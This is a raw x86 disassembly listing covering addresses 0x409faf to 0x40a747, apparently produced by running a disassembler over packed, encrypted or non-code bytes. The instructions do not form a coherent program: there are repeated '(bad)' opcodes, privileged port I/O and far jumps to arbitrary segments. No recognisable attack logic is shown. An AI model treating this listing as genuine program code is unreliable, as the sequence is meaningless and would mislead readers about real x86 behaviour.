  409faf:	xor    ebp,DWORD PTR [ecx+0x7dc1334d]
  409fb5:	push   ebp
  409fb6:	xor    cl,BYTE PTR cs:[ecx+0x68960653]
  409fbd:	vpslld xmm1{z},xmm7,XMMWORD PTR [edx]
  409fc3:	ins    DWORD PTR es:[edi],dx
  409fc4:	or     eax,0x6fac5112
  409fc9:	lds    ecx,FWORD PTR [esi+0x78]
  409fcc:	add    BYTE PTR [esi],bl
  409fce:	sub    cl,BYTE PTR [eax]
  409fd0:	out    0xc5,eax
  409fd2:	add    al,0x64
  409fd4:	xchg   BYTE PTR [edx+0x7e],ah
  409fd7:	sbb    esi,eax
  409fd9:	pop    ebx
  409fda:	stos   DWORD PTR es:[edi],eax
  409fdb:	stc    
  409fdc:	or     DWORD PTR [edx],esi
  409fde:	(bad)  [eax+eax*8-0x2a5f66b0]
  409fe5:	retf   
  409fe6:	lds    edi,FWORD PTR ss:[ecx+0x25]
  409fea:	push   ecx
  409feb:	xor    al,0x7c
  409fed:	cmc    
  409fee:	or     BYTE PTR [esi],bl
  409ff0:	sbb    eax,0x96d2ebce
  409ff5:	enter  0xb2f1,0x9a
  409ff9:	stos   BYTE PTR es:[edi],al
  409ffa:	adc    edx,DWORD PTR [ebx+ebx*8]
  409ffd:	add    DWORD PTR [ebp+0x4defc2db],edx
  40a003:	les    esp,FWORD PTR [eax]
  40a005:	lods   eax,DWORD PTR ds:[esi]
  40a006:	retf   0x5ca7
  40a009:	adc    DWORD PTR [ecx+0xe216cb],0x7a5a8744
  40a013:	mov    eax,es:0x9da0ccd
  40a019:	outs   dx,BYTE PTR ds:[esi]
  40a01a:	or     BYTE PTR [edi-0x67],0xa
  40a01e:	push   edi
  40a01f:	cld    
  40a020:	and    BYTE PTR [eax-0x29],ah
  40a023:	dec    ebx
  40a024:	cmp    esp,DWORD PTR ds:0xdfb5d51d
  40a02a:	mov    bh,0x2d
  40a02c:	jno    0x409fbe
  40a02e:	cmc    
  40a02f:	popf   
  40a030:	outs   dx,BYTE PTR ds:[esi]
  40a031:	fs iret 
  40a033:	std    
  40a034:	out    dx,al
  40a035:	aaa    
  40a036:	mov    eax,0x43125f83
  40a03b:	das    
  40a03c:	test   al,0x4b
  40a03e:	into   
  40a03f:	jno    0x40a06c
  40a041:	sar    BYTE PTR [ecx-0x15f8d53e],1
  40a047:	adc    eax,0xc2821b75
  40a04c:	rcl    DWORD PTR [ecx+ebx*1],cl
  40a04f:	xor    DWORD PTR [eax-0xa],edx
  40a052:	ret    0x5c29
  40a055:	imul   eax,DWORD PTR [eax+ebp*2+0x7f],0x5b
  40a05a:	sub    BYTE PTR [ecx+edi*4-0x7271669f],ch
  40a061:	mov    ebx,0xc0dbff81
  40a066:	cmp    DWORD PTR [esi],0x4
  40a069:	add    cl,BYTE PTR [edx+0x28]
  40a06c:	cmp    BYTE PTR [ecx+0x195ce216],dl
  40a072:	shl    eax,cl
  40a074:	loope  0x40a0aa
  40a076:	js     0x40a0ba
  40a078:	jmp    0xc846b34b
  40a07d:	adc    dh,bl
  40a07f:	mov    ch,0x5c
  40a081:	or     bh,dl
  40a083:	mov    ebp,0xd8e33ef1
  40a088:	lock sbb eax,0xc3750f08
  40a08e:	pop    eax
  40a08f:	fisubr DWORD PTR [ebp-0x36260f21]
  40a095:	in     eax,0x40
  40a097:	pop    edx
  40a098:	outs   dx,BYTE PTR ds:[esi]
  40a099:	rcr    BYTE PTR [edx-0x7c],0x1e
  40a09d:	push   es
  40a09e:	and    al,0x7f
  40a0a0:	imul   esi,DWORD PTR [ecx+0x10],0x13b6ac94
  40a0a7:	push   0x46
  40a0a9:	pusha  
  40a0aa:	inc    edx
  40a0ab:	push   cs
  40a0ac:	cwde   
  40a0ad:	aaa    
  40a0ae:	imul   eax,DWORD PTR [ebp-0x4c173a3f],0xe0b396d2
  40a0b8:	repz (bad) 
  40a0ba:	ficom  DWORD PTR [eax-0x3d]
  40a0bd:	or     DWORD PTR [esi],esi
  40a0bf:	vmwrite edi,DWORD PTR [ecx+0x51]
  40a0c3:	call   0x483f3d89
  40a0c8:	sub    BYTE PTR [edx],ch
  40a0ca:	stos   DWORD PTR es:[edi],eax
  40a0cb:	int    0xc
  40a0cd:	sbb    BYTE PTR [esi+eax*2],0x2d
  40a0d1:	add    dl,BYTE PTR [ebx+ecx*2-0x60]
  40a0d5:	mov    eax,0xd35978a4
  40a0da:	pop    es
  40a0db:	and    cl,dh
  40a0dd:	fld    TBYTE PTR [esi]
  40a0df:	or     DWORD PTR [ecx+esi*4-0x7a70023a],edx
  40a0e6:	fisub  DWORD PTR [edi+0x1d44b77c]
  40a0ec:	test   al,0x6f
  40a0ee:	xor    DWORD PTR [ebp-0x5],ecx
  40a0f1:	or     DWORD PTR [esi-0x56],ebx
  40a0f4:	test   DWORD PTR [ecx],ecx
  40a0f6:	fwait
  40a0f7:	rol    DWORD PTR [esi-0x635e5a60],0x5c
  40a0fe:	cmp    al,0xb7
  40a100:	(bad)  
  40a101:	and    dl,BYTE PTR [ebx+0x4cf17f1a]
  40a107:	mov    cl,0xc5
  40a109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a10a:	xor    edx,DWORD PTR [edi]
  40a10c:	pop    es
  40a10d:	push   ds
  40a10e:	repnz xchg ebx,eax
  40a110:	hlt    
  40a111:	mov    eax,0xc0bdbf9f
  40a116:	(bad)  
  40a117:	dec    edi
  40a118:	or     ebx,DWORD PTR [edx+eax*8-0x4e]
  40a11c:	mov    ds:0xfdb724fb,al
  40a121:	mov    WORD PTR [edi],cs
  40a123:	xchg   ecx,eax
  40a124:	mov    eax,0xc037185c
  40a129:	jg     0x40a1a8
  40a12b:	out    0x9c,al
  40a12d:	mov    esi,?
  40a12f:	enter  0x26a5,0xe
  40a133:	(bad)  
  40a134:	(bad)  
  40a135:	fstp   QWORD PTR [ebp-0x58]
  40a138:	adc    BYTE PTR [ebx],0x8e
  40a13b:	mov    ds:0xb2d878a2,eax
  40a140:	or     eax,0x70b16747
  40a145:	and    al,0x47
  40a147:	adc    eax,0xe4ee9543
  40a14c:	fs je  0x40a1c2
  40a14f:	loop   0x40a198
  40a151:	jae    0x40a132
  40a153:	in     eax,dx
  40a154:	outs   dx,BYTE PTR ds:[esi]
  40a155:	test   cl,bh
  40a157:	jnp    0x40a127
  40a159:	repnz and esp,edi
  40a15c:	sub    al,0x8f
  40a15e:	icebp  
  40a15f:	out    dx,al
  40a160:	adc    DWORD PTR [ebx-0x69],ebx
  40a163:	daa    
  40a164:	and    ebx,DWORD PTR [ebp-0x24c956c5]
  40a16a:	imul   edx,ebx,0x6e18d7cc
  40a170:	gs repz cmp eax,0xdbb3c769
  40a177:	aas    
  40a178:	or     BYTE PTR [edx-0x9fb2722],cl
  40a17e:	xchg   esi,esp
  40a180:	mov    esp,0xc3e3c73d
  40a185:	gs stos DWORD PTR es:[edi],eax
  40a187:	dec    eax
  40a188:	push   es
  40a189:	and    esp,edi
  40a18b:	cwde   
  40a18c:	xor    eax,0x91eff756
  40a191:	inc    esi
  40a192:	and    al,0x2f
  40a194:	adc    DWORD PTR [ebx+edx*1-0x6598042a],edi
  40a19b:	pop    es
  40a19c:	ret    0x7a95
  40a19f:	scas   eax,DWORD PTR es:[edi]
  40a1a0:	ror    BYTE PTR [eax-0x7a],1
  40a1a3:	test   DWORD PTR ds:0x15654702,ebx
  40a1a9:	dec    edx
  40a1aa:	inc    DWORD PTR [ebx-0x16]
  40a1ad:	lock aas 
  40a1af:	enter  0x5db5,0x95
  40a1b3:	call   0x2e4cfd29
  40a1b8:	sbb    BYTE PTR [esi],dh
  40a1ba:	shl    esp,cl
  40a1bc:	clc    
  40a1bd:	mov    BYTE PTR [edi-0x2c970de5],dl
  40a1c3:	int    0x31
  40a1c5:	scas   eax,DWORD PTR es:[edi]
  40a1c6:	mov    ds:0x44a4c9ab,al
  40a1cb:	fisttp WORD PTR [ecx-0x6c]
  40a1ce:	xor    al,0x5c
  40a1d0:	rcl    DWORD PTR [edi+0x6d7664e3],1
  40a1d6:	xor    BYTE PTR [edx-0x297adca6],al
  40a1dc:	xchg   esi,eax
  40a1dd:	mov    ebx,0x755d8f13
  40a1e2:	arpl   WORD PTR [ecx-0x24],di
  40a1e5:	adc    BYTE PTR [ebx-0x4d],bh
  40a1e8:	fadd   DWORD PTR [ebp+0x325ec872]
  40a1ee:	dec    ecx
  40a1ef:	or     edx,DWORD PTR [ecx]
  40a1f1:	dec    edi
  40a1f2:	sub    ch,cl
  40a1f4:	pop    ecx
  40a1f5:	clc    
  40a1f6:	dec    eax
  40a1f7:	and    bh,ah
  40a1f9:	test   al,0xc8
  40a1fb:	sbb    dl,dl
  40a1fd:	ret    
  40a1fe:	loopne 0x40a22a
  40a200:	sub    BYTE PTR [esi-0x3984d9d1],bl
  40a206:	sbb    BYTE PTR [ebx],bl
  40a208:	in     eax,dx
  40a209:	push   es
  40a20a:	mov    ds:0x9a1f5470,al
  40a20f:	push   eax
  40a210:	lock add BYTE PTR [esi+ecx*8-0x8],bl
  40a215:	in     eax,0x63
  40a217:	jp     0x40a267
  40a219:	jl     0x40a1fd
  40a21b:	push   cs
  40a21c:	addr16 mov bh,0x21
  40a21f:	out    0xb4,al
  40a221:	sbb    edi,esp
  40a223:	test   DWORD PTR [ecx],edx
  40a225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a226:	pop    ds
  40a227:	repz arpl bp,cx
  40a22a:	lods   eax,DWORD PTR ds:[esi]
  40a22b:	jle    0x40a2a7
  40a22d:	sar    DWORD PTR [ecx],cl
  40a22f:	sbb    bh,bh
  40a231:	outs   dx,BYTE PTR ds:[esi]
  40a232:	fdivr  QWORD PTR [eax]
  40a234:	rcl    BYTE PTR [edi-0x64],1
  40a237:	cli    
  40a238:	repnz push ss
  40a23a:	add    ebx,esp
  40a23c:	sbb    BYTE PTR [edx+0x5a23b0e3],al
  40a242:	jl     0x40a231
  40a244:	hlt    
  40a245:	xchg   esp,eax
  40a246:	cld    
  40a247:	and    DWORD PTR [ecx-0x63b81e62],eax
  40a24d:	ins    BYTE PTR es:[edi],dx
  40a24e:	aad    0x3d
  40a250:	pop    edx
  40a251:	rol    DWORD PTR [eax+0x25],1
  40a254:	xchg   esi,eax
  40a255:	mov    bl,0xc6
  40a257:	pop    ss
  40a258:	push   esp
  40a259:	dec    edx
  40a25a:	test   al,0x34
  40a25c:	addr16 dec ecx
  40a25e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a25f:	jmp    0x48a9:0xddbf78b4
  40a266:	adc    BYTE PTR [ecx],dh
  40a268:	jae    0x40a27b
  40a26a:	pop    ebp
  40a26b:	sbb    eax,0x91798f01
  40a270:	xor    DWORD PTR [eax-0xed7b6a2],ecx
  40a276:	icebp  
  40a277:	lods   al,BYTE PTR ds:[esi]
  40a278:	ja     0x40a2df
  40a27a:	inc    esp
  40a27b:	xor    ecx,DWORD PTR [esi-0x79074e1a]
  40a281:	jmp    0x407c:0x4851d5d9
  40a288:	jmp    0x40a247
  40a28a:	cmp    dh,ch
  40a28c:	bound  esi,QWORD PTR [esi-0x59]
  40a28f:	out    0x76,al
  40a291:	dec    ecx
  40a292:	sub    eax,0xb6f34d8a
  40a297:	dec    edx
  40a298:	aad    0x91
  40a29a:	cli    
  40a29b:	in     al,0xc4
  40a29d:	fild   WORD PTR [esi-0x7b]
  40a2a0:	lods   al,BYTE PTR ds:[esi]
  40a2a1:	lock stos DWORD PTR es:[edi],eax
  40a2a3:	xchg   esp,eax
  40a2a4:	xchg   ebx,eax
  40a2a5:	pop    es
  40a2a6:	xor    BYTE PTR [ebx+0x536648d5],0xa4
  40a2ad:	in     al,dx
  40a2ae:	or     ebx,DWORD PTR [esi+0x45]
  40a2b1:	daa    
  40a2b2:	inc    edi
  40a2b3:	jae    0x40a32b
  40a2b5:	popa   
  40a2b6:	shl    BYTE PTR [eax+esi*2-0x19],0xbc
  40a2bb:	fwait
  40a2bc:	data16 loop 0x40a302
  40a2bf:	in     al,dx
  40a2c0:	sub    BYTE PTR [esi+0x2297e9d6],ch
  40a2c6:	xor    BYTE PTR [esi+0x553f3b57],dl
  40a2cc:	adc    al,0x1
  40a2ce:	jmp    0x5cb8:0x41634502
  40a2d5:	ss pop eax
  40a2d7:	sub    BYTE PTR [ebx+eax*4],0xe3
  40a2db:	push   esi
  40a2dc:	xor    DWORD PTR [ecx+0xc6d8dbb],edi
  40a2e2:	lods   eax,DWORD PTR ds:[esi]
  40a2e3:	leave  
  40a2e4:	xchg   esi,eax
  40a2e5:	jle    0x40a287
  40a2e7:	sti    
  40a2e8:	addr16 lock pop edi
  40a2eb:	push   eax
  40a2ec:	fsub   DWORD PTR [edi]
  40a2ee:	fwait
  40a2ef:	mov    ch,0xb2
  40a2f1:	and    ch,BYTE PTR [eax]
  40a2f3:	mov    cs:0x67298225,al
  40a2f9:	adc    al,0x4b
  40a2fb:	pop    esi
  40a2fc:	jle    0x40a341
  40a2fe:	or     al,0xbc
  40a300:	jl     0x40a339
  40a302:	repz xor bh,BYTE PTR [ecx+ecx*4+0x3f]
  40a307:	sub    DWORD PTR [eax+0x685b5c19],ebp
  40a30d:	aas    
  40a30e:	fs test BYTE PTR cs:[ebx],bh
  40a312:	pop    ds
  40a313:	cmp    ah,BYTE PTR [eax]
  40a315:	add    al,0x21
  40a317:	popf   
  40a318:	inc    edx
  40a319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a31a:	and    WORD PTR [ebp*2+0x2e955386],bp
  40a322:	icebp  
  40a323:	and    DWORD PTR [edi],edi
  40a325:	and    BYTE PTR [edi],ah
  40a327:	mov    dh,0x8e
  40a329:	jae    0x40a2d2
  40a32b:	les    edi,FWORD PTR [esi]
  40a32d:	push   ebp
  40a32e:	test   BYTE PTR [eax+0x64eec281],al
  40a334:	mov    WORD PTR [ebx],ds
  40a336:	sti    
  40a337:	sbb    BYTE PTR [ebx],bl
  40a339:	mov    al,ds:0x36042b0a
  40a33e:	data16 test ch,bh
  40a341:	xor    bl,bh
  40a343:	jns    0x40a380
  40a345:	pusha  
  40a346:	push   eax
  40a347:	(bad)  
  40a348:	xchg   edx,eax
  40a349:	(bad)  
  40a34a:	in     al,0x71
  40a34c:	sub    eax,0x76f7fd63
  40a351:	add    ecx,eax
  40a353:	ret    0x77ee
  40a356:	cmp    al,0x7
  40a358:	aad    0x8d
  40a35a:	adc    ebx,DWORD PTR cs:[eax]
  40a35d:	add    eax,0x48126866
  40a362:	pop    eax
  40a363:	cli    
  40a364:	js     0x40a380
  40a366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a367:	xlat   BYTE PTR ds:[ebx]
  40a368:	in     al,0x16
  40a36a:	jl     0x40a39e
  40a36c:	dec    ecx
  40a36e:	push   ebp
  40a36f:	ja     0x40a3ab
  40a371:	shl    edi,1
  40a373:	dec    ecx
  40a374:	jmp    FWORD PTR [ebx-0x16]
  40a377:	(bad)  
  40a378:	xor    BYTE PTR [esp+edi*4-0x2],ch
  40a37c:	xchg   edi,eax
  40a37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a37e:	sbb    eax,DWORD PTR [ecx+ecx*2+0x4951ac18]
  40a385:	fistp  WORD PTR [ecx-0x124596bc]
  40a38b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a38c:	test   al,0x45
  40a38e:	jecxz  0x40a32e
  40a390:	iret   
  40a391:	adc    ebp,DWORD PTR [ebp-0x15bb78da]
  40a397:	push   ds
  40a398:	in     eax,dx
  40a399:	(bad)  
  40a39a:	xor    DWORD PTR [ecx],edx
  40a39c:	out    0x8a,eax
  40a39e:	xchg   ecx,eax
  40a39f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3a0:	mov    al,BYTE PTR [edi-0x67]
  40a3a3:	jnp    0x40a337
  40a3a5:	xor    al,0xf0
  40a3a7:	cmp    ch,BYTE PTR [eax]
  40a3a9:	lock dec ebx
  40a3ab:	mov    ds,WORD PTR [ecx-0x24a8923e]
  40a3b1:	pop    bp
  40a3b3:	adc    esp,DWORD PTR [ecx]
  40a3b5:	sahf   
  40a3b6:	imul   ebp,DWORD PTR [edi+0x51],0xffffffbf
  40a3ba:	or     al,0x24
  40a3bc:	inc    edx
  40a3bd:	pop    edx
  40a3be:	xchg   BYTE PTR [edi-0x18],cl
  40a3c1:	and    eax,0x8d94e8ce
  40a3c6:	in     eax,0xfa
  40a3c8:	sbb    edi,eax
  40a3ca:	call   0xec08:0x4c190827
  40a3d1:	push   0x68
  40a3d3:	sub    eax,DWORD PTR [eax-0x206b367]
  40a3d9:	fs add esi,eax
  40a3dc:	cmp    ebx,DWORD PTR ds:0x44516cd8
  40a3e2:	mov    BYTE PTR [edx],ah
  40a3e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3e5:	cvtpi2ps xmm3,QWORD PTR [ecx+0x1a]
  40a3e9:	cld    
  40a3ea:	test   al,0xe2
  40a3ec:	mov    BYTE PTR ds:0xd791529,al
  40a3f2:	pop    ebp
  40a3f3:	not    DWORD PTR [edi]
  40a3f5:	mov    ebp,0xdba55b9b
  40a3fa:	lea    esp,[edx+0x33]
  40a3fd:	sbb    edi,DWORD PTR [ecx-0x6b]
  40a400:	push   0x89715920
  40a405:	pop    ds
  40a406:	das    
  40a407:	pop    esp
  40a408:	ss push 0x3fecd8c1
  40a40e:	xor    DWORD PTR [eax],esp
  40a410:	sub    eax,0x21076ff5
  40a415:	sub    DWORD PTR [eax],ebp
  40a417:	xor    al,0x1b
  40a419:	push   eax
  40a41a:	xor    ah,BYTE PTR [ebx-0x764674e1]
  40a420:	pop    ebp
  40a421:	enter  0x349c,0xae
  40a425:	adc    al,0x0
  40a427:	dec    eax
  40a428:	xchg   edx,eax
  40a429:	xchg   ecx,eax
  40a42a:	call   0xd65f:0xb1f7b43c
  40a431:	fsub   DWORD PTR [edi-0x3c]
  40a434:	push   0x950a1a84
  40a439:	jbe    0x40a3c9
  40a43b:	(bad)  
  40a43c:	push   ecx
  40a43d:	retf   
  40a43e:	fdiv   QWORD PTR [ecx-0x40]
  40a441:	scas   al,BYTE PTR es:[edi]
  40a442:	fdiv   QWORD PTR [eax+edx*8-0x7b]
  40a446:	cmp    DWORD PTR [ecx+0x60244ef0],ebx
  40a44c:	xchg   ebp,eax
  40a44d:	ss push eax
  40a44f:	xor    ch,BYTE PTR [eax+0x3594e587]
  40a455:	cwde   
  40a456:	inc    edx
  40a457:	shl    BYTE PTR [ebp+0x3ac6000b],cl
  40a45d:	add    ebx,DWORD PTR [ecx]
  40a45f:	push   ebp
  40a460:	ds mov al,0xdc
  40a463:	push   ds
  40a464:	lods   eax,DWORD PTR ds:[esi]
  40a465:	fisttp DWORD PTR [ebx-0x73]
  40a468:	sbb    ecx,ebp
  40a46a:	pop    ss
  40a46b:	cld    
  40a46c:	mov    WORD PTR [ecx-0x264d6dbc],es
  40a472:	shl    DWORD PTR [ebp+edx*4-0x4b],cl
  40a476:	push   ss
  40a477:	test   al,0x64
  40a479:	scas   al,BYTE PTR es:[edi]
  40a47a:	test   eax,0x560dd75c
  40a47f:	ja     0x40a425
  40a481:	es cli 
  40a483:	mov    ds:0xc456f8bf,eax
  40a488:	inc    eax
  40a489:	aas    
  40a48a:	or     ah,al
  40a48c:	jle    0x40a4cd
  40a48e:	add    eax,0xd4ab023a
  40a493:	mov    ebp,0xa55637f7
  40a498:	(bad)  [esi+0x6d]
  40a49b:	mov    edi,0x89f77364
  40a4a0:	fisttp WORD PTR [esi+0x4671f3d6]
  40a4a6:	sbb    BYTE PTR [edi-0x3],bl
  40a4a9:	mov    DWORD PTR [eax-0x10],ebx
  40a4ac:	sbb    eax,0x49c0474d
  40a4b1:	and    eax,0x357b1d8c
  40a4b6:	inc    DWORD PTR [ecx+0x62]
  40a4b9:	test   DWORD PTR [edi-0x4d],ebp
  40a4bc:	jb     0x40a53c
  40a4be:	xchg   edx,eax
  40a4bf:	adc    eax,0xf57a0ec6
  40a4c4:	jmp    0x4716:0x892beb27
  40a4cb:	adc    eax,0xb17e7ee1
  40a4d0:	sti    
  40a4d1:	fcom   QWORD PTR [ebx]
  40a4d3:	aas    
  40a4d4:	xchg   esp,eax
  40a4d5:	mov    al,ds:0x6a9abc5b
  40a4da:	ret    
  40a4db:	(bad)  
  40a4dc:	lahf   
  40a4dd:	fld    QWORD PTR [eax-0x783950fb]
  40a4e3:	test   al,0xb5
  40a4e5:	inc    esi
  40a4e6:	das    
  40a4e7:	mov    ah,0x1e
  40a4e9:	popf   
  40a4ea:	adc    edx,ebx
  40a4ec:	sbb    BYTE PTR [eax+esi*1-0x3],bl
  40a4f0:	pop    ds
  40a4f1:	imul   esi,DWORD PTR [esi],0xffffffd7
  40a4f4:	sub    al,BYTE PTR [ebp+0x5da38824]
  40a4fa:	adc    ebp,eax
  40a4fc:	(bad)  
  40a4fd:	lock retf 0xb118
  40a501:	pop    esp
  40a502:	retf   
  40a503:	push   esi
  40a504:	retf   
  40a505:	mov    edi,0xa22895c
  40a50a:	add    eax,0xd5eedfeb
  40a50f:	test   eax,0x794cbb04
  40a514:	or     al,0x2d
  40a516:	sbb    al,0xcb
  40a518:	xor    esi,edi
  40a51a:	xchg   dh,dl
  40a51c:	movq   mm4,QWORD PTR [ecx-0x57a16817]
  40a523:	sar    DWORD PTR [edx+0x65],cl
  40a526:	xor    BYTE PTR [edi+eiz*4],cl
  40a529:	jmp    0x3541:0x725ce279
  40a530:	out    dx,al
  40a531:	push   edi
  40a532:	mov    bl,0x15
  40a534:	jmp    0x5d588212
  40a539:	dec    esi
  40a53a:	mov    dh,0xc5
  40a53c:	or     esp,DWORD PTR [edx-0x7b69bb5]
  40a542:	jl     0x40a59b
  40a544:	sbb    al,0x49
  40a546:	jp     0x40a526
  40a548:	ret    
  40a549:	adc    ch,BYTE PTR [ecx+0x67dbc4b2]
  40a54f:	mov    DWORD PTR [eax-0x13],edi
  40a552:	addr16 loop 0x40a4fb
  40a555:	adc    eax,0xc03203da
  40a55a:	fcmovu st,st(0)
  40a55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a55d:	push   esp
  40a55e:	mov    esp,0xd7dc3846
  40a563:	imul   ebp,DWORD PTR [edi],0xfe18be95
  40a569:	xor    eax,0x2597311c
  40a56e:	div    BYTE PTR [ecx+ecx*4+0x3c]
  40a572:	jle    0x40a503
  40a574:	lea    ebp,[ebx-0x6954a8fc]
  40a57a:	popa   
  40a57b:	and    esp,DWORD PTR [eax]
  40a57d:	jmp    0x40a5c1
  40a57f:	shl    al,0x1b
  40a582:	test   DWORD PTR [esi-0x15530365],esp
  40a588:	cwde   
  40a589:	cmp    eax,0x4233f12d
  40a58e:	ret    0xcdc7
  40a591:	mov    bh,0x48
  40a593:	dec    edi
  40a594:	jno    0x40a539
  40a596:	stos   DWORD PTR es:[edi],eax
  40a597:	pushf  
  40a598:	aas    
  40a599:	lods   al,BYTE PTR ds:[esi]
  40a59a:	push   eax
  40a59b:	sub    BYTE PTR [edi],bh
  40a59d:	mov    ds:0xc47015d,al
  40a5a2:	jbe    0x40a529
  40a5a4:	fidivr DWORD PTR ds:0x3067f2b5
  40a5aa:	push   cs
  40a5ab:	jmp    0x5954:0x5709545b
  40a5b2:	fisttp DWORD PTR ss:[ebx+0x24]
  40a5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b7:	adc    ebp,DWORD PTR [ebx]
  40a5b9:	loopne 0x40a56e
  40a5bb:	jmp    0x40a59e
  40a5bd:	jmp    0x26655b18
  40a5c2:	test   al,0xa
  40a5c4:	xlat   BYTE PTR ds:[ebx]
  40a5c5:	pushf  
  40a5c6:	push   ss
  40a5c7:	inc    ebp
  40a5c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5c9:	push   0x137e5957
  40a5ce:	jg     0x40a605
  40a5d0:	jbe    0x40a5e4
  40a5d2:	inc    edi
  40a5d3:	in     al,0x55
  40a5d5:	push   0x19414803
  40a5da:	adc    ch,BYTE PTR [eax-0x6734824a]
  40a5e0:	(bad)  
  40a5e1:	iret   
  40a5e2:	xchg   ah,bh
  40a5e4:	push   0xffffffc8
  40a5e6:	imul   edx,DWORD PTR [ecx],0x33
  40a5e9:	icebp  
  40a5ea:	mov    dl,0x7d
  40a5ec:	push   ecx
  40a5ed:	cld    
  40a5ee:	(bad)  
  40a5ef:	in     al,dx
  40a5f0:	add    DWORD PTR [di+0x2f],esi
  40a5f4:	data16 mov bl,0xce
  40a5f7:	and    al,0xe5
  40a5f9:	mov    al,0x2b
  40a5fb:	cmp    eax,DWORD PTR [eax]
  40a5fd:	cmc    
  40a5fe:	scas   al,BYTE PTR es:[edi]
  40a5ff:	push   ss
  40a600:	adc    esi,esi
  40a602:	aas    
  40a603:	pop    ss
  40a604:	stos   BYTE PTR es:[edi],al
  40a605:	sar    edx,1
  40a607:	xchg   ebx,eax
  40a608:	push   ecx
  40a609:	into   
  40a60a:	mov    bh,BYTE PTR [ebx-0x1531e4e4]
  40a610:	inc    edx
  40a611:	popf   
  40a612:	mov    BYTE PTR [eax+ecx*8],dh
  40a615:	ss aad 0xa
  40a618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a619:	jl     0x40a621
  40a61b:	mov    ebx,0xc7397879
  40a620:	or     eax,0xefc7036e
  40a625:	add    al,0x93
  40a627:	fcomp  DWORD PTR [ecx-0x7c]
  40a62a:	je     0x40a5ae
  40a62c:	jmp    0x4538be99
  40a631:	into   
  40a632:	sbb    esp,DWORD PTR [ebx+0x4d]
  40a635:	dec    ebp
  40a636:	fsub   QWORD PTR [esi-0x28]
  40a639:	push   esi
  40a63a:	shl    DWORD PTR [ebp-0x67d5ac63],cl
  40a640:	mov    ecx,0x8b871314
  40a645:	fist   WORD PTR [ebx]
  40a647:	inc    eax
  40a648:	stos   DWORD PTR es:[edi],eax
  40a649:	loopne 0x40a65c
  40a64b:	dec    ecx
  40a64c:	adc    eax,0xd2eb6459
  40a651:	xchg   esp,eax
  40a652:	jecxz  0x40a60d
  40a654:	jle    0x40a67f
  40a656:	mov    ch,0x2f
  40a658:	fmul   QWORD PTR [ebx+0x5ccc71e4]
  40a65e:	mov    ebx,0x3a4e5a83
  40a663:	sub    DWORD PTR [eax+0x5b4a772e],edi
  40a669:	arpl   ax,di
  40a66b:	inc    esi
  40a66c:	inc    ebp
  40a66d:	xor    al,0x8a
  40a66f:	ret    0x16d9
  40a672:	in     al,0x9a
  40a674:	in     eax,0x0
  40a676:	xor    eax,0xf0c72f9d
  40a67b:	ret    
  40a67c:	sub    al,0x5b
  40a67e:	retf   0x2f05
  40a681:	icebp  
  40a682:	popa   
  40a683:	mov    ah,0xba
  40a685:	and    BYTE PTR [edx],al
  40a687:	or     BYTE PTR [eax],dh
  40a689:	mov    eax,0xeca3bac0
  40a68e:	fs jmp 0x3db3bac
  40a694:	mov    BYTE PTR [ebx+0x2d],dl
  40a697:	adc    al,0x52
  40a699:	push   ds
  40a69a:	push   esp
  40a69b:	pop    esp
  40a69c:	inc    esi
  40a69d:	inc    edi
  40a69e:	dec    ebp
  40a69f:	shl    DWORD PTR ds:0x5250297d,cl
  40a6a5:	push   0x6c
  40a6a7:	pop    esi
  40a6a8:	sub    BYTE PTR [ebx-0x54],dh
  40a6ab:	(bad)  
  40a6ac:	aad    0xe6
  40a6ae:	out    0xc3,al
  40a6b0:	mov    BYTE PTR [edi-0x74],bl
  40a6b3:	test   BYTE PTR [ecx-0x13a45b1c],dh
  40a6b9:	jmp    DWORD PTR [ebx-0x4c]
  40a6bc:	sbb    ebx,DWORD PTR [ebx]
  40a6be:	xor    BYTE PTR [ecx+edi*2-0x2efd5a3b],dh
  40a6c5:	fimul  DWORD PTR [edx-0x50]
  40a6c8:	cs call 0x7f51:0x5b0b9665
  40a6d0:	mov    ch,0xf3
  40a6d2:	test   eax,0xafb32871
  40a6d7:	sub    esp,ebx
  40a6d9:	cwde   
  40a6da:	je     0x40a6da
  40a6dc:	(bad)  [ebp-0x48eaaa9b]
  40a6e2:	jmp    0xba4185d8
  40a6e7:	(bad)  
  40a6e8:	sub    bl,BYTE PTR [edx]
  40a6ea:	les    ebp,FWORD PTR [ebx+0x52d37e1b]
  40a6f0:	jg     0x40a680
  40a6f2:	push   DWORD PTR [esi+ebp*4-0x74]
  40a6f6:	test   BYTE PTR [ebp+esi*2+0x77],al
  40a6fa:	mov    eax,ebx
  40a6fc:	ins    DWORD PTR es:[edi],dx
  40a6fd:	inc    ebx
  40a6fe:	retf   0x4e4f
  40a701:	or     DWORD PTR [eax+edi*1-0x422eb514],0x0
  40a709:	repz mov cl,BYTE PTR [ebp+0x55d24d82]
  40a710:	push   ss
  40a711:	(bad)  
  40a712:	repnz push ds
  40a714:	ret    0xdd7c
  40a717:	jns    0x40a6ce
  40a719:	mov    eax,0x9674a2b9
  40a71e:	scas   al,BYTE PTR es:[di]
  40a720:	jge    0x40a6c8
  40a722:	gs mov ah,0x3d
  40a725:	out    dx,eax
  40a726:	int3   
  40a727:	jg     0x40a75c
  40a729:	mov    al,0xb4
  40a72b:	fdiv   QWORD PTR [eax-0x52]
  40a72e:	jle    0x40a6f9
  40a730:	push   0xb502722c
  40a735:	(bad)  
  40a736:	sub    dl,BYTE PTR [ebp+0x46602f75]
  40a73c:	dec    esi
  40a73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a73e:	xlat   BYTE PTR ds:[ebx]
  40a73f:	shr    DWORD PTR [edi+0x2d],0xec
  40a743:	shr    edx,0xa0
  40a746:	inc    eax
  40a747:	inc    esp
